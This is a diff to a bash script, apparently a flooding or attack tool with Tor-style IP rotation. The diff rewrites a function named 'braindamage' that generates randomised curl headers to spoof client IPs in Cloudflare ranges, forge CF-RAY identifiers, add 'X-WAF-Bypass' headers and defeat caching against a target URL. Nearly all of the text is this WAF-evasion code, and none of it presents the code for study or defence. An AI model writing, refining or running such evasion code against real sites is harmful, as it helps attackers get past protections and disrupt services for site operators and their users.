@@ -55,10 +55,22 @@ print_defiance_logo() {
         echo -e "\e[0;31m[\e[0m!\e[0;37m]\e[0m MultiCircuit Rotation Enabled. IPs are shifting dynamically per request.!"
     fi
 }
-
 braindamage() {
     local choice=$((RANDOM % 3))
     local cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)
+    if [[ "$target_url" == *"?"* ]]; then
+        case "$choice" in
+            0) 
+                echo "-H 'Content-Type: application/json' -H 'X-Forwarded-For: 127.0.0.1' -H 'CF-Connecting-IP: 172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1))' -H 'CF-RAY: ${cf_ray}-CGK'" 
+                ;;
+            1) 
+                echo "-H 'Content-Type: application/json' -H 'CF-Visitor: {\"scheme\":\"https\"}'" 
+                ;;
+            2) 
+                echo "-H 'Content-Type: application/json' -H 'X-WAF-Bypass: True' -H 'CF-IPCountry: US' -H 'True-Client-IP: 103.21.244.$((RANDOM % 254 + 1))'" 
+                ;;
+        esac
+    else
         case "$choice" in
             0)
                 echo "-H 'Content-Type: application/json' -H 'Authorization: Bearer $cf_ray' -H 'X-WAF-Bypass: True' -H 'CF-IPCountry: US'" 
@@ -69,20 +81,6 @@ braindamage() {
             2)
                 echo "-H 'Content-Type: application/json' -H 'Cache-Control: no-cache, no-store' -H 'Pragma: no-cache' -H 'X-Forwarded-For: 127.0.0.1'" 
                 ;;
-        esac
-        return
-    fi
-    if [[ "$target_url" != *"?"* ]]; then
-        case "$choice" in
-            0) echo "-H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
-            1) echo "-H Content-Type:application/json -H CF-Visitor:{\"scheme\":\"https\"}" ;;
-            2) echo "-H X-WAF-Bypass:True -H CF-IPCountry:US -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
-        esac
-    else
-        case "$choice" in
-            0) echo "-H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
-            1) echo "-H Content-Type:application/json;multipart/form-data;boundary=$((RANDOM % 9999)) -H CF-Visitor:{\"scheme\":\"https\"}" ;;
-            2) echo "-H X-WAF-Bypass:True -H CF-IPCountry:US -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
         esac
     fi
 }
